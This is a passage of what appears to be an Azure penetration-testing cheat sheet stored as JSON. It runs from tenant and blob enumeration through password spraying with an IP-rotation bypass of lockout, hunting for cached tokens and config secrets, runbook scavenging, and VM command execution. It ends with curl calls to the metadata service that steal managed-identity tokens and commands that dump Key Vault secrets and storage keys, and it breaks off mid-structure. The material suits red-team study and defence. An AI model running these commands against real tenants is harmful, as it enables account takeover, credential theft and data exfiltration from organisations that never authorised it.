    "sections": [
        {
            "heading": "Azure Basic Concepts",
            "subheadings": [
                {
                    "heading": "Identity & Authentication Models",
                    "type": "list",
                    "content": [
                        "**Password Hash Synchronization (PHS)**: On-prem hashes synced to Azure (Azure AD Connect)",
                        "**Pass Through Authentication (PTA)**: On-prem agent validates requests; no creds in cloud",
                        "**Federation (ADFS)**: Trusted relationship between Azure and on-prem AD",
                        "**Certificate-based Auth**: Client certificates for API and Service Principals",
                        "**Conditional Access**: Policy-based access controls (MFA, location, etc.)"
                    ]
                },
                {
                    "heading": "Service Domain Reference",
                    "type": "link",
                    "title": "Azure Services and their Default Domains",
                    "url": "https://learn.microsoft.com/en-us/azure/security/fundamentals/azure-domains"
                }
            ]
        },
        {
            "heading": "Reconnaissance & Enumeration",
            "subheadings": [
                {
                    "heading": "Tenant & Domain Discovery",
                    "type": "code_block",
                    "content": [
                        "# Check if a company uses Azure AD / O365",
                        "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1",
                        "",
                        "# Get Tenant ID from domain",
                        "Get-AADIntTenantID -Domain target.onmicrosoft.com",
                        "https://login.microsoftonline.com/target.com/.well-known/openid-configuration"
                    ]
                },
                {
                    "heading": "Subdomain & Storage Discovery",
                    "type": "code_block",
                    "content": [
                        "# MicroBurst - Enumerate subdomains and blobs",
                        "Invoke-EnumerateAzureSubDomains -Base COMPANY -Verbose",
                        "Invoke-EnumerateAzureBlobs -Base COMPANY",
                        "",
                        "# Azure Storage predictable URLs",
                        "https://[account].blob.core.windows.net",
                        "https://[account].file.core.windows.net"
                    ]
                }
            ]
        },
        {
            "heading": "Attack Vectors: Access & Credentials",
            "subheadings": [
                {
                    "heading": "Password Spraying & Protections",
                    "type": "list",
                    "content": [
                        "Spray via `https://login.microsoftonline.com/common/oauth2/token`",
                        "[MSOLSpray](https://github.com/dafthack/MSOLSpray) - Detects MFA, locked, and disabled accounts",
                        "**Smart Lockout Bypass**: Use [FireProx](https://github.com/ustayready/fireprox) to rotate IP addresses"
                    ]
                },
                {
                    "heading": "Token & Secret Extraction",
                    "type": "list",
                    "content": [
                        "Search disk for `TokenCache.dat` and `AzureRmContext.json` in `%USERPROFILE%\\.azure\\`",
                        "Audit web config files: `web.config`, `app.config`, `.publishsettings`",
                        "Extract Management Certificates from `.publishsettings` (Base64 encoded PFX)"
                    ]
                }
            ]
        },
        {
            "heading": "Post-Compromise Exploitation",
            "subheadings": [
                {
                    "heading": "Resource & Permission Discovery",
                    "type": "code_block",
                    "content": [
                        "Get-AzSubscription             # List available subscriptions",
                        "Get-AzRoleAssignment           # Check current user's roles",
                        "Get-AzResource                 # List all accessible resources",
                        "Get-AzResourceGroup            # List resource groups",
                        "Get-AzStorageAccount           # List storage accounts"
                    ]
                },
                {
                    "heading": "Automation & Persistence",
                    "type": "code_block",
                    "content": [
                        "# Scavenge Runbooks for credentials",
                        "Get-AzAutomationRunbook -AutomationAccountName <name> -ResourceGroupName <rg>",
                        "Export-AzAutomationRunbook -Name <runbook> -OutputFolder ./",
                        "",
                        "# Execute commands on VMs (RunCommand)",
                        "az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts \"id\""
                    ]
                }
            ]
        },
        {
            "heading": "Identity Infrastructure Comparison",
            "type": "image",
            "src": "/gitbook/assets/AzureADvsAD[1].png",
            "caption": "Traditional Active Directory vs Azure AD Conceptual Mapping"
        },
        {
            "heading": "Cloud Services Exploitation",
            "subheadings": [
                {
                    "heading": "Managed Identity & Metadata",
                    "type": "code_block",
                    "content": [
                        "# Extract Access Tokens for different resources from Metadata Service",
                        "curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"",
                        "curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net\"",
                        "curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com\""
                    ]
                },
                {
                    "heading": "Key Vault & Storage Attacks",
                    "type": "code_block",
                    "content": [
                        "# Key Vault secret retrieval",
                        "az keyvault secret list --vault-name <vault>",
                        "az keyvault secret show --vault-name <vault> --name <secret>",
                        "",
                        "# Storage Account key exfiltration",
                        "az storage account keys list --account-name <storage-account>",
                        "az storage blob list --container-name <container> --account-name <storage-account> --account-key <key>"
                    ]
                }
            ]
        },
        {
            "heading": "Azure Password Reset Workflow",
            "type": "image",
            "src": "/gitbook/assets/image (50).png",
            "caption": "Azure Self-Service Password Reset (SSPR) Flow"
        },
        {
            "type": "image",
